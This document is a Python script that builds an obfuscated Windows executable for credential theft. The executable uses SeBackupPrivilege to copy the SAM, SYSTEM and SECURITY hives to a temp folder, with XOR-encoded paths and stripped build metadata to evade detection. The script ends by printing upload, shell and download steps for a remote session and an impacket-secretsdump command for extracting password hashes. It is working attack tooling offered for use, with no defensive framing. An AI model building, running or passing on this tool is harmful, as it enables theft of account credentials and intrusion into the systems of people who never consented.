#!/usr/bin/env python3
"""
gen_samread.py — Read SAM/SYSTEM/SECURITY hive files directly from disk.
Uses SeBackupPrivilege + FILE_FLAG_BACKUP_SEMANTICS to bypass:
  - Registry API (reg save) -> not used at all
  - DACL on hive files     -> bypassed by SeBackupPrivilege
  - File lock              -> registry opens hives with FILE_SHARE_READ
No shell commands, no registry API, pure file I/O.
Parse: impacket-secretsdump -sam sam.dat -system sys.dat -security sec.dat LOCAL
"""
import os, sys, subprocess, shutil, tempfile

ROOT = os.path.dirname(os.path.abspath(__file__))
OUT  = os.path.join(ROOT, 'samread.exe')

KEY = 0x5C
def enc(s): return ','.join(str(ord(c) ^ KEY) for c in s + '\x00')

# Source hive paths
SAM_SRC      = 'C:\\Windows\\System32\\config\\SAM\x00'
SYSTEM_SRC   = 'C:\\Windows\\System32\\config\\SYSTEM\x00'
SECURITY_SRC = 'C:\\Windows\\System32\\config\\SECURITY\x00'
SAM_DST      = 'C:\\Windows\\Temp\\sam.dat\x00'
SYS_DST      = 'C:\\Windows\\Temp\\sys.dat\x00'
SEC_DST      = 'C:\\Windows\\Temp\\sec.dat\x00'

sam_src_enc  = enc(SAM_SRC)
sys_src_enc  = enc(SYSTEM_SRC)
sec_src_enc  = enc(SECURITY_SRC)
sam_dst_enc  = enc(SAM_DST)
sys_dst_enc  = enc(SYS_DST)
sec_dst_enc  = enc(SEC_DST)

c_src = f"""
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <stdlib.h>

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)

/* ── enable a privilege by LUID ─────────────────────────────────────── */
static BOOL enable_priv(const wchar_t *name) {{
    HANDLE tok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return FALSE;
    LUID luid; BOOL ok = FALSE;
    if (LookupPrivilegeValueW(NULL, name, &luid)) {{
        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount           = 1;
        tp.Privileges[0].Luid       = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        ok = AdjustTokenPrivileges(tok, FALSE, &tp, 0, NULL, NULL);
        if (ok && GetLastError() == ERROR_NOT_ALL_ASSIGNED) ok = FALSE;
    }}
    CloseHandle(tok);
    return ok;
}}

/* ── decrypt XOR string ─────────────────────────────────────────────── */
static void xd(char *out, const BYTE *e, int n) {{
    for (int i=0;i<n;i++) out[i]=(char)(e[i]^0x{KEY:02X});
}}

/* ── copy one file using backup semantics ───────────────────────────── */
static BOOL backup_copy(const char *src, const char *dst) {{
    /* Open source with FILE_FLAG_BACKUP_SEMANTICS (bypasses DACL) */
    HANDLE hSrc = CreateFileA(src,
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_SEQUENTIAL_SCAN,
        NULL);
    if (hSrc == INVALID_HANDLE_VALUE) return FALSE;

    HANDLE hDst = CreateFileA(dst,
        GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDst == INVALID_HANDLE_VALUE) {{
        CloseHandle(hSrc);
        return FALSE;
    }}

    BYTE buf[65536];
    DWORD rd, wr;
    BOOL ok = TRUE;
    while (ok && ReadFile(hSrc, buf, sizeof(buf), &rd, NULL) && rd > 0)
        ok = WriteFile(hDst, buf, rd, &wr, NULL) && wr == rd;

    CloseHandle(hSrc);
    CloseHandle(hDst);
    return ok;
}}

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {{
    (void)h;(void)p;(void)cmd;(void)show;

    /* Enable SeBackupPrivilege */
    if (!enable_priv(L"SeBackupPrivilege"))
        return 1;

    /* Decrypt paths */
    static const BYTE SS[]={{{sam_src_enc}}};
    static const BYTE YS[]={{{sys_src_enc}}};
    static const BYTE ES[]={{{sec_src_enc}}};
    static const BYTE SD[]={{{sam_dst_enc}}};
    static const BYTE YD[]={{{sys_dst_enc}}};
    static const BYTE ED[]={{{sec_dst_enc}}};

    char sam_src[MAX_PATH]={{0}}, sys_src[MAX_PATH]={{0}}, sec_src[MAX_PATH]={{0}};
    char sam_dst[MAX_PATH]={{0}}, sys_dst[MAX_PATH]={{0}}, sec_dst[MAX_PATH]={{0}};
    xd(sam_src, SS, sizeof(SS)-1);
    xd(sys_src, YS, sizeof(YS)-1);
    xd(sec_src, ES, sizeof(ES)-1);
    xd(sam_dst, SD, sizeof(SD)-1);
    xd(sys_dst, YD, sizeof(YD)-1);
    xd(sec_dst, ED, sizeof(ED)-1);

    int rc = 0;
    if (!backup_copy(sam_src, sam_dst)) rc |= 2;
    if (!backup_copy(sys_src, sys_dst)) rc |= 4;
    if (!backup_copy(sec_src, sec_dst)) rc |= 8;
    return rc;
}}
"""

tmp = tempfile.mkdtemp(prefix='samread_build_')
try:
    src = os.path.join(tmp, 'samread.c')
    exe = os.path.join(tmp, 'samread.exe')
    open(src, 'w').write(c_src)

    print('[*] Compiling samread.exe (backup-semantics hive reader) ...')
    r = subprocess.run([
        'x86_64-w64-mingw32-gcc', '-O2', '-s', '-mwindows',
        '-o', exe, src,
        '-lkernel32', '-ladvapi32',
        '-Wl,--no-seh', '-fno-ident', '-fno-asynchronous-unwind-tables',
    ], capture_output=True, text=True)

    if r.returncode != 0:
        dbg = os.path.join(ROOT, 'samread_debug.c')
        open(dbg, 'w').write(c_src)
        print(f'[!] Build failed — source in {dbg}')
        print(r.stderr[-4000:])
        sys.exit(1)

    shutil.copy(exe, OUT)
finally:
    shutil.rmtree(tmp, ignore_errors=True)

print(f'[+] {OUT}  ({os.path.getsize(OUT):,} bytes)')
print()
print('Deploy:')
print(f'  upload {OUT} C:\\Windows\\Temp\\samread.exe')
print(f'  shell C:\\Windows\\Temp\\samread.exe')
print(f'  download C:\\Windows\\Temp\\sam.dat')
print(f'  download C:\\Windows\\Temp\\sys.dat')
print(f'  download C:\\Windows\\Temp\\sec.dat')
print()
print('Parse on Kali:')
print('  impacket-secretsdump -sam sam.dat -system sys.dat -security sec.dat LOCAL')
